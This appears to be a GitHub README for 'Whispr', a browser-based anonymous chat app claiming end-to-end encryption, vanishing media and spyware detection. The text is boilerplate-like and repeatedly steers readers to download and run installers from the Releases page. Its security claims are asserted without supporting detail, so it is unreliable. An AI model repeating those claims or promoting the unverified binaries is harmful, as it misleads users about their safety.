[![Releases](https://img.shields.io/badge/Releases-GitHub%20Releases-brightgreen?style=for-the-badge&logo=github)](https://github.com/mohadesehfllh/whispr/releases)

# Whispr: Minimal End-to-End Encrypted Anonymous Chat

Whispr is a lean chat app focused on privacy and simplicity. It uses end-to-end encryption, requires no accounts, stores no user data, and supports vanishing media. You create a private link, choose nicknames, and chat without exposing anything about your identity. Messages and images disappear after viewing, audio calls stay secure, and the app actively detects spyware or screenshot attempts. This README explains what Whispr does, how to try it, and how to contribute to its ongoing development.

- Topics: chat, css, end-to-end-encryption, express, html, javascript, npm, open-source, react, render, replit, typescript

If you’re looking to grab a copy or keep track of updates, you can access the Releases page here: https://github.com/mohadesehfllh/whispr/releases. This link hosts the latest build artifacts and installers for different platforms. For quick access, see the Release assets section later in this document. The link is also repeated in a dedicated Releases section to help you find the latest files quickly.

---

## Quick overview

Whispr aims to be a straightforward tool for private, ephemeral chats. It avoids traditional account systems and centralized data stores. Instead, it relies on direct, encrypted communication between participants linked by a private URL you share. The design prioritizes:

- Privacy by default: no accounts, no central user data, no persistent chat history on servers you don’t control.
- Ephemeral communications: messages and media fade away, reducing long-term exposure.
- Simple discovery: users join a chat by sharing a private link, then pick nicknames to preserve anonymity.
- Secure voice calls: audio conversations stay encrypted end-to-end.
- Privacy defenses: the app actively attempts to detect spyware or screenshot attempts on the client device.

This approach favors users who want a minimal, private chat experience without complex setup.

---

## Why Whispr exists

In a world where many chat apps rely on accounts, cloud storage, and long-lived data trails, Whispr offers an alternative. It’s designed for people who want to:

- Keep conversations independent of a central service.
- Minimize metadata and data persistence.
- Use straightforward tools without login friction.
- Communicate with confidence that messages won’t linger beyond their usefulness.

Whispr does not assume perfect security, but it commits to clear, user-centered privacy properties and transparent operation. It’s built with a belief that privacy can be practical, not just theoretical.

---

## Core principles

- End-to-end encryption: messages are encrypted on the sender’s device and decrypted only on the recipient’s device.
- No accounts: no sign-up, no profiles, no credential leakage.
- No data storage: no user data is kept by a central service beyond the immediate session.
- Vanishing media: images and messages disappear after they are viewed or after a session ends.
- Anonymous nicknames: users pick nicknames to avoid real-world identifiers.
- Secure audio: voice calls are encrypted and kept private.
- Anti-spyware and anti-screenshot: the client detects some forms of device-based spying or screen capture.

---

## How it works at a high level

- A user generates a private chat link that acts as an invitation to a session.
- Participants join the chat by opening the link in their browser and choosing nicknames.
- Messages and media are transmitted with end-to-end encryption so only the intended recipient can read them.
- Media and messages vanish according to the configured lifecycle, reducing residual data.
- Audio calls establish a secure channel between participating peers.
- The app monitors for conditions that indicate spyware or screen capture attempts and provides cues to users.

Whispr emphasizes client-side security and local control, with a lightweight server layer that coordinates peer discovery and session management without storing chat content.

---

## Features in depth

- Minimal setup: no accounts or sign-ins. You join a chat via a private link.
- Anonymous presence: pick a nickname and participate without revealing identity.
- Ephemeral data: messages and images disappear after they’ve served their purpose.
- Encrypted communications: end-to-end encryption protects messages and calls.
- Secure audio calls: real-time voice communication with encryption.
- Privacy-first design: the app minimizes dwell time for data, reducing exposure windows.
- Anti-privacy tricks: built-in checks help detect attempts to capture the screen or spy on the session.
- Cross-platform readiness: designed to work in web environments with a focus on lightweight delivery.
- Open source: code is available for review, improvement, and extension.

---

## Prerequisites and environment

Whispr is built with modern web technologies and is designed to run in an environment that supports standard web APIs. The project uses:

- Node.js and npm for development workflows.
- TypeScript for type safety.
- React for the user interface.
- Express for the lightweight server component.
- CSS and HTML for the layout and presentation.

Before you begin, ensure you have:

- Node.js (version compatible with the project; check package.json or the releases page for guidance).
- npm or a compatible package manager.
- A modern browser for client testing.

If you’re working on Windows, macOS, or Linux, the same codebase should run in a typical development environment with the right dependencies.

---

## Getting started: trying Whispr locally

Note: the following steps assume you want to run Whispr on your own machine for development, testing, or local usage. The process is designed to be straightforward and should work with minimal setup.

1) Get the code
- Clone the repository:
  - git clone https://github.com/mohadesehfllh/whispr.git
  - cd whispr

2) Install dependencies
- Install the project’s dependencies:
  - npm install

3) Run in development mode
- Start the local server and client:
  - npm run dev
- If your project uses a separate script for building the client and starting the server, follow the project’s README or package.json scripts. The dev command should compile the TypeScript sources, start the Express server, and spin up the client environment for testing.

4) Open the app
- In your browser, navigate to the local address provided by the dev server (commonly http://localhost:3000 or similar). You should see the chat interface ready for use.

5) Create a private chat
- Generate a private link from the app’s UI and share it with the people you want to chat with.
- On joining, pick nicknames and begin exchanging messages and media with end-to-end encryption safeguards active by default.

6) Try vanishing media and messages
- Send a message or image and observe the lifecycle: the content should vanish after it’s viewed or after the set expiry window, depending on local configuration.

7) Test audio calls
- Initiate a voice call with another participant who is connected to the same session. The call should be encrypted and delivered via the peer-to-peer channel or the app’s minimal signaling server.

If you want to test the release artifacts instead of running from source, refer to the Releases page for platform-specific installers or binaries. The link to the release assets is available here: https://github.com/mohadesehfllh/whispr/releases. This link is the same target as the one above and is provided again in the Release assets section to help you locate the right file for your system.

Release assets and download instructions:
- From the Releases page, download the release asset appropriate for your platform.
- Run or install the asset according to the provided instructions.
- If a checksum or signature is provided, verify it before running the installer.
- Launch the app and test the chat flow, including private link creation, nickname selection, message exchange, vanishing media, and audio calls.

---

## Build and architecture overview

Whispr uses a lightweight architecture to keep things simple and private. At a high level, you’ll find:

- Client: a web-based interface built with React and TypeScript. The client handles:
  - User interface for chats and media.
  - Local enforcement of privacy features (like vanishing content).
  - End-to-end encryption for message payloads and media.
  - Anti-spyware and anti-screenshot cues and indicators.

- Server: a small Express-based server that coordinates handshake messages, room creation, and session metadata without storing chat content. The server is designed to be stateless and to minimize data retention.

- Encryption layer: cryptographic primitives implemented on the client to secure messages in transit and at rest on each participant’s device. Only the intended recipient can decrypt messages, and media keys are exchanged in a way that preserves forward secrecy.

- Media handling: images and other media are transmitted securely and are designed to vanish according to a client-controlled lifecycle.

- Session lifecycle: a session is created via a private link. Participants join the session by entering nicknames and gaining access to the ephemeral chat. The lifecycle is bounded by the session’s lifetime and local policies, ensuring limited data persistence.

- Anti-spyware and anti-screenshot components: lightweight checks and indicators in the client that help users recognize suspicious activity on their device during a session.

This architecture favors simplicity and privacy. It is designed so that the server does not need to hold your chat content, and the most sensitive data stays on user devices.

---

## Security and privacy model

Whispr’s security stance focuses on minimizing data exposure and ensuring that communications stay private between participants. Key aspects include:

- End-to-end encryption (E2EE): Messages and media are encrypted on the sender’s device and decrypted only on recipients’ devices. Servers carry only encrypted payloads or session coordination messages that do not reveal content.

- No accounts, no data storage: Without user accounts, there is no central user directory or long-lived data store tied to individuals. Chat histories are transient and local to the devices involved in the session.

- Private links for session creation: A private URL is the entry point to a session. Only those who possess the link can participate, limiting discovery and reducing broad exposure.

- Vanishing media and messages: Content is designed to disappear after it serves its purpose, reducing the window for data leakage or misuse.

- Anonymous nicknames: Participants can choose nicknames to avoid real identity disclosure while still facilitating a meaningful chat flow.

- Secure audio calls: Voice conversations are encrypted in a way that minimizes leakage and eavesdropping risks.

- Spyware and screenshot detection: The client performs checks to identify suspicious activity on the device that could be used to capture or monitor the chat. If detected, users receive indicators to take appropriate action.

- Transparency and openness: The codebase is open for review, so developers can inspect how privacy is implemented, how keys are managed, and how data flows through the system.

Whispr emphasizes a pragmatic approach to privacy: it reduces reliance on central data stores and gives users control over their chat sessions.

---

## Privacy considerations and user guidance

- Data retention: Since Whispr does not store chat content on a server, long-term data retention is minimized. Users should understand that device storage and local backups can still persist content if they save media locally.

- Device security: The security model relies on the integrity of the client device. Users should keep their devices secure and avoid using Whispr on compromised devices.

- Link sharing: Private links control access to sessions. Treat links as you would treat any sensitive credential. Share them only with intended participants.

- Screenshots and monitoring: If the device or environment includes monitoring tools or spyware, Whispr’s anti-snoop features may detect some of these situations. Such detection is not a guarantee, as sophisticated surveillance may circumvent local checks. Users should be mindful of their environment when handling sensitive conversations.

- No network is flawless: While encryption protects content, metadata such as timing and session existence can still be inferred by network observers. The design aims to minimize this exposure, but users should be aware of the broader privacy landscape.

- Exported data: If you use the app on multiple devices, you may have small local traces on those devices. Ensure you understand how each device handles ephemeral data and whether any backups exist.

---

## Developer guide: contributing, testing, and extending

This project welcomes contributions from developers who care about privacy, security, and a clean user experience. If you want to help, here are guidelines to get started.

- Codebase overview: The client is built with React and TypeScript. The server uses Express and simple routing to coordinate sessions. Styling is CSS-based for clarity and accessibility.

- Setup for development: See the Getting started section for setup steps. Use the standard npm workflow to install dependencies, build assets, and run a local server.

- Running tests: The project may include unit tests and lightweight integration tests. Look for test scripts in package.json and the tests directory. Run tests with npm test or a project-specific command.

- Linting and formatting: Use your preferred linter and formatter configured in the project. Keeping code style consistent helps with readability and long-term maintenance.

- Accessibility: The UI should be navigable with a keyboard and usable with screen readers. If you contribute UI changes, ensure accessibility is preserved.

- Documentation: If you add new features, update the README with usage instructions, security notes, and any caveats. Clear documentation helps users grasp privacy implications and usage patterns.

- Security-minded contributions: When proposing changes that touch encryption, session handling, or media lifecycles, include a high-level security rationale and any potential tradeoffs. Encourage code reviews focused on security and privacy.

- Licensing: The project is open source and typically released under a permissive license. If you contribute, follow the license terms and include appropriate attribution.

---

## API and extensibility

Whispr is primarily a client-first experience with a minimal server layer. The public-facing API surface is designed to be simple and privacy-forward:

- Session management endpoints: used to create and join private chat sessions via a link.
- Message transport: end-to-end encrypted payloads are delivered to peers via the server as needed.
- Media delivery: images and other media are transmitted with encryption and ephemeral lifecycles.
- Call signaling: lightweight signaling messages set up secure audio calls.

If you want to extend Whispr, consider adding:

- Additional client-side themes or UI customizations without changing privacy semantics.
- Optional local options to customize the vanishing policy for media and messages.
- Integrations with privacy tools that help users audit their sessions.

---

## Release management and updates

The project follows a release-based approach. You can track changes by visiting the Releases page, which hosts platform-specific installers, binaries, or portable assets. Each release typically includes:

- A brief summary of changes and improvements.
- Platform-specific assets for Windows, macOS, Linux, or web-delivery formats.
- Checksums or signatures to verify integrity (where provided).
- Any migration notes or breaking changes, if applicable.

Access the releases page here: https://github.com/mohadesehfllh/whispr/releases. This is the primary source of fresh installation files and updates. For convenience, the link is repeated in this section and the earlier portion of this document so you can locate the latest assets quickly. If you cannot access the Releases page for any reason, you can check the repository’s main branch for a quick start guide and links to the latest assets, but the Releases page remains the authoritative source for installers.

---

## Troubleshooting and common issues

- Cannot connect to a session: ensure the private link is correct and that both parties are online. If you face repeated trouble, try creating a new session and sharing a fresh link.
- Media not vanishing: verify that the lifecycle settings on the client are enabled and that both sides have the latest build. Some legacy builds may have different defaults.
- Audio calls failing: confirm microphone permissions in the browser and that the participants have stable network connectivity.
- Anti-spyware indicators: if you see alerts, make sure you are running in a trusted environment and that no other apps are attempting to capture the screen.

If you cannot resolve an issue, check the Releases page for known fixes in recent builds. The Release assets page is designed to provide quick access to tested builds and their notes.

---

## Roadmap and future directions

- Stronger privacy controls: more explicit user controls for data retention, session lifetimes, and per-chat settings.
- Expanded device support: better performance on mobile browsers and lightweight desktop environments.
- Improved key management: streamlined onboarding for new participants while preserving privacy guarantees.
- Enhanced accessibility: more accessible UI improvements for users with diverse needs.
- Community-driven features: invitation for contributors to propose enhancements and vote on priorities.

The project remains open to thoughtful contributions that align with its privacy-first philosophy and minimalistic approach.

---

## License

Whispr is released under a permissive open-source license. This choice enables users to study, modify, and share the code. If you contribute, please respect attribution requirements and license terms. The license text is included in the repository.

---

## Contributing

- Start with issues labeled “help wanted” or “good first issue.”
- Open a pull request with a clear description of the feature or fix.
- Ensure tests pass and that changes do not degrade privacy or security properties.
- Follow the project’s coding style and documentation guidelines.
- Engage with maintainers respectfully and respond to feedback promptly.

---

## Acknowledgments and inspirations

Whispr draws on established ideas from secure messaging and privacy-first design. It builds on community-driven efforts to create lightweight, transparent tools that respect user autonomy. The project appreciates the contributors who spend time reviewing, testing, and documenting the code. It also draws inspiration from the broader ecosystem of privacy-focused software and open-source collaboration.

---

## Call to action for readers

- Explore the Releases page to download the latest build for your platform.
- Try creating a private chat with a couple of peers and experience the end-to-end encryption flow.
- Share feedback about the user experience, privacy controls, or any edge cases you encounter.
- If you want to contribute, review the issues and open a pull request with a plan and clear notes.

For quick access to updates and build files, visit the Releases page again here: https://github.com/mohadesehfllh/whispr/releases. The page hosts the latest installers and assets, making it easy to try Whispr on your preferred platform.

---

Emojis to brighten the read and reflect the theme:
- 🔒 Privacy-first design
- 🗝️ End-to-end encryption
- 🚀 Lightweight and fast
- 🧭 Anonymous sessions
- 🧪 Testing and iteration
- 💬 Chat and media with vanish mode
- 📦 Release assets for builds

Images and visuals:
- The README uses badges for quick navigation and status checks.
- Emoji-based visuals pair with the text to deliver a friendly, accessible experience.
- Where images are referenced, prefer badges or simple inline visuals to stay lightweight and accessible.

Notes:
- The initial link to the release assets appears at the top as a badge that links to the Releases page.
- The same link is referenced again in the Release management section to reinforce where to obtain installers and assets.